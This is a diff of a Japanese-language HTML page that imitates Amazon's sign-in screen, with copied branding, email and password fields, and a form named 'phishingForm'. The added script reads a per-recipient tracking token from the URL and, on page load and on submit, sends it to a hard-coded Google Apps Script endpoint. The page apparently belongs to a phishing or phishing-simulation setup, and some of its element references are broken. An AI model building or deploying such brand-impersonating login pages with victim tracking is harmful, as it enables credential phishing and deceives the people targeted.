@@ -1,41 +1,186 @@
 <!DOCTYPE html>
 <html lang="ja">
-<head>
-  <base target="_top">
-  <meta charset="UTF-8" />
-  <title>サインイン - Amazon</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-</head>
-<body>
-  <style>
-    body {
-      margin:0;
-    }
-    iframe {
-      width: 100%;
-      overflow: hidden;
-      height: 100vh;
-    }
-  </style>
-<iframe id="phishingForm" src=""></iframe>
-  <script>
-  // ページ読み込み後にクエリパラメータを取得してフォームのactionを設定
-  window.addEventListener('DOMContentLoaded', function() {
-    // 現在のURLのパラメータを解析
-    const urlParams = new URLSearchParams(window.location.search);
-    const token = urlParams.get('tid');   // ?tid=xxx を取得
+  <head>
+    <base target="_top">
+    <meta charset="UTF-8" />
+    <title>サインイン - Amazon</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+      body {
+        margin: 0;
+        padding: 0;
+        font-family: Arial, sans-serif;
+        background-color: #ECEFF1;
+      }
+  
+      .logo-area {
+        text-align: center;
+        padding: 20px 0;
+      }
+  
+      .logo-area img {
+        max-width: 120px;
+        height: auto;
+      }
+  
+      /* メインコンテナ */
+      .login-container {
+        max-width: 350px;
+        margin: 0 auto;
+        padding: 20px;
+        background-color: #FFFFFF;
+        border: 1px solid #D5D9D9;
+        border-radius: 4px;
+      }
+  
+      .login-container h1 {
+        font-weight: 400;
+        margin-bottom: 10px;
+        font-size: 1.2rem;
+      }
+  
+      .form-group {
+        margin-bottom: 15px;
+      }
+  
+      .form-label {
+        display: block;
+        font-weight: bold;
+        margin-bottom: 4px;
+        font-size: 0.9rem;
+      }
+  
+      .form-input {
+        width: 100%;
+        padding: 8px;
+        font-size: 1rem;
+        box-sizing: border-box;
+        border: 1px solid #A6A6A6;
+        border-radius: 3px;
+      }
+  
+      .submit-button {
+        width: 100%;
+        background-color: #F0C14B;
+        border: 1px solid #A88734;
+        border-radius: 3px;
+        padding: 8px;
+        font-size: 1rem;
+        cursor: pointer;
+        font-weight: bold;
+        margin-top: 10px;
+      }
+  
+      .submit-button:hover {
+        background-color: #F2C84B;
+      }
+  
+      .note-text {
+        font-size: 0.8rem;
+        color: #555;
+        margin-top: 10px;
+        line-height: 1.4;
+      }
+  
+      .footer {
+        text-align: center;
+        margin-top: 20px;
+        font-size: 0.75rem;
+        color: #555;
+      }
+  
+      /* スマホなど狭い画面でフォームがぎゅっと縮まないよう微調整 */
+      @media (max-width: 400px) {
+        .login-container {
+          margin: 0 10px;
+          border: none;
+          border-radius: 0;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="logo-area">
+      <!-- 実例: <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon"> -->
+      <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzc4LjAiIGhlaWdodD0iMTI1LjEiIHZpZXdCb3g9IjAgMCAzNzguMCAxMjUuMSIgZW5hYmxlLWJhY2tncm91bmQ9Im5ldyAwIDAgMzc4LjAgMTI1LjEiIHhtbDpzcGFjZT0icHJlc2VydmUiIHN0eWxlPSJtYXgtd2lkdGg6IDI1MHB4OyI+PHBhdGggZmlsbD0iI2U2Y2I0MSIgZD0iTTgxLjUsOTUuOGwtNC41LTIuM2MtMS44LTEtMS44LTIuNCAwLTMuN2wxMS45LTcuOGMzLjQtMi4yLDYuNy0xLjEsOC41LDEgMS44LDEuOSwxLjgsNC40LDAsNi0xLDEtMi4xLDEuMy0zLjcsMC0xLjMtMS41LTItMy44LTEtNS4zIDEuOC0yLjUsMy4xLTYuNSwxLjgtOS43TDEwNiwzNy43Yy0xLjgtNC00LjItNC41LTYuOC0zLjYtMS45LDEtNS43LDMtOS42LDZjLTMuNywzLjQtNSw2LjctMy4yLDkuNWw2LjIsOC4xYzEuOSwyLjYsNC4yLDMuMiw3LDEuNGw3LjEtNC43YzMuNC0yLDYuNS0xLjcsOC40LDEuN2wyLjYsNC44YzEuOSwzLjM1LjcsNy4zLTYuNSwxMS4yTDgzLjUsOTUuOHoiLz48cGF0aCBmaWxsPSIjY2YxOTJhIiBkPSJNMzcwLjgsNDUuNUwzNjcuNyw0MWwtOC44IDkuN0MtMzcuNi01LjEgMy43LTI0LjItMTMuNy0yOC45TDM3MC44LDQ1LjV6Ii8+PHBhdGggZmlsbD0iIzAwMzdhZiIgZD0iTTI2My45LDguOGMtMTQuOS0uMS0yNS42LDEwLjQtMjUuNywyNC45cy4xLDM2LjgsMjUuMyw0My4xYzI2LjQsNi41LDU3LjktMS42LDYyLjMtMTQuN3MyLjYtMzcLjktMjIuOC00Mi4yYy0xMy44LTIuOC0yMy44LTMuMS0zOS0xLjF6IE0yOTUuNiwzN2MtMi43LTYuMy05LjUtMTAuMi0xNi0xMC4zYy03LjYsMC0xNC40LDMuNi0xNi45LDEwLjYtMS4yLDQuMS0xLjcsOS0xLjcsMTUgMiw2LjIuNiw5LjMsNC4yLDEwLjMgMS4yLjUtMjIuNCwwLTI0LjUtNC4zbDAsMGMtMjIuMS0zOC4zIDIuNC0xNTAuNywzLjgtMTU1LjIgNjkuNiwzMy4xLTI5LjYyLDkuMy0xMTkuNjMsMzguOS0xNTMuMyw1LjJsMTAzLjEtMjcuMWMwLDEsMi4zLDAtMi42LDMwLjkgMTMuOCwzNiw0NS43LDE4LjQsMTExLjcsNi4yIi8+PHBhdGggZmlsbD0iI2ZmZjIwMCIgZD0iTTIwNS40LDExNi43Yy0xOC42LDUuNS00NS4zLDYuNi03Mi40LDEuOEw5OSwxMDYuNGMtNjQuNi0xMS4yLTExMi4xLTMyLjItMTQ3LjItN20tMTguNy05LjFoMGMtNi44LTEzLjUtNC43LTI2LjksMTEtMzkuNnMwLDEzLjUuMiwyNi45Yy0uMywyLTIuNCwzLjItMy4zLDMuMmwtNy4yLjFjLTYuMSwwLTExLjYtNC4xLTEyLjktMTAuM2wtMi41LTE1LjMgNTMuOSwzNy45YzI0LjMtMTQuNyw0OS4zLTMyLjUsNjcuMy00OC4xYzAtLjMtMS4xLTIuMS0xLjMtMi4zIi8+PGc+PGc+PC9nPjwvZz48L3N2Zz4=" alt="Amazon Logo">
+    </div>
 
-    // ここに実際のGASのWebアプリURLを貼り付けてください
-    const GAS_BASE_URL = "https://script.google.com/macros/s/AKfycbwlBs5Ikzo3e80FM7n9ZbsueRA9EtXy1bTJplueSvhAAhOs5hAR0-iMZBlqXrOsPS0Y/exec?mode=form&token=";
+    <div class="login-container">
+      <h1>サインイン</h1>
+      <form id="phishingForm" action="" method="POST">
+        <div class="form-group">
+          <label for="userId" class="form-label">Eメールまたは携帯電話番号</label>
+          <input type="text" id="userId" name="userId" class="form-input">
+        </div>
+  
+        <div class="form-group">
+          <label for="password" class="form-label">パスワード</label>
+          <input type="password" id="password" name="password" class="form-input">
+        </div>
+  
+        <button type="submit" class="submit-button">サインイン</button>
+  
+        <div class="note-text">
+          サインインすることで、Amazonの利用規約、プライバシー規約に同意したものとみなされます。
+        </div>
+      </form>
+    </div>
 
-    // tokenが取得できた場合はフォームactionを動的に設定
-    if (token) {
-      document.getElementById('phishingForm').src = GAS_BASE_URL + encodeURIComponent(token);
-    } else {
-      // tokenが無い場合は、デフォルトの値やエラー処理を行う
-      document.getElementById('phishingForm').src = GAS_BASE_URL + "notoken";
-    }
-  });
-  </script>
-</body>
+    <div id="done-container" class="hidden">
+      <h3>送信ありがとうございました。</h3>
+    </div>
+
+    <div class="footer">
+      <p>© 1996-2024, Amazon.com, Inc. またはその関連会社</p>
+    </div>
+
+    <script>
+      (function(){
+        // 1) tokenを取得
+        const params = new URLSearchParams(location.search);
+        const token  = params.get('tid') || 'notoken';
+  
+        // 2) GASの公開URLをセット
+        //    doGet(...?mode=click&token=xxx) 用 & doPost(...?mode=form&token=xxx) 用
+        const GAS_BASE = 'https://script.google.com/macros/s/AKfycbwlBs5Ikzo3e80FM7n9ZbsueRA9EtXy1bTJplueSvhAAhOs5hAR0-iMZBlqXrOsPS0Y/exec';
+  
+        // 3) ページがロードされた瞬間 = クリックとみなし、GETリクエスト
+        //    fetch( /exec?mode=click&token=xxx )
+        fetch(`${GAS_BASE}?mode=click&token=${encodeURIComponent(token)}`)
+          .then(res => res.text())
+          .then(data => {
+            console.log("ClickLog response:", data);
+          })
+          .catch(err => {
+            console.error("ClickLog error:", err);
+          });
+  
+        // 4) フォーム送信ボタン
+        const submitBtn = document.getElementById('submitBtn');
+        submitBtn.addEventListener('click', function(){
+          // 送信データをFormDataで組み立てる
+          const formData = new FormData();
+          formData.append('token', token);
+  
+          // fetchでPOST
+          fetch(GAS_BASE, {
+            method: 'POST',
+            body: formData
+          })
+          .then(res => res.text())
+          .then(html => {
+            console.log("Form submit response:", html);
+            // フォームを非表示、完了メッセージを表示
+            document.getElementById('login-container').classList.add('hidden');
+            document.getElementById('done-container').classList.remove('hidden');
+          })
+          .catch(err => {
+            alert("Error: " + err);
+            console.error(err);
+          });
+        });
+  
+      })();
+    </script>
+  </body>
 </html>
